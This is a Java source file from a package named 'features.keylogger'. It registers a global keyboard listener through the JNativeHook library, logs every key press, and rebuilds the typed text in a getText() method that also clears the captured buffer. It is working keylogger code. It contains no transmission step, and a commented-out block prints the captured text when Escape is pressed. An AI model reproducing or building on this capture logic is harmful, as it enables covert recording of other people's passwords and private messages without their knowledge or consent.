package features.keylogger;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.util.ArrayList;
public class KeyListener implements NativeKeyListener {

    private ArrayList<String> data = new ArrayList<String>();
    public void nativeKeyPressed(NativeKeyEvent e) {
        data.add(NativeKeyEvent.getKeyText(e.getKeyCode()));

//        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
//            try {
//                GlobalScreen.unregisterNativeHook();
////                System.out.println(data);
//                System.out.println(getText());
//            } catch (NativeHookException nativeHookException) {
//                nativeHookException.printStackTrace();
//            }
//        }
    }

    public String getText(){
        ArrayList<String> newData = new ArrayList<String>();
        for (String x : this.data){
            if (x=="Space"){
                newData.add(" ");
            } else if (x.length()==1){
                newData.add(x);
            }
        }
        String output = "";
        this.data = new ArrayList<String>();
        for (String x:newData){
            output += x;
        }
        return output;
    }

}
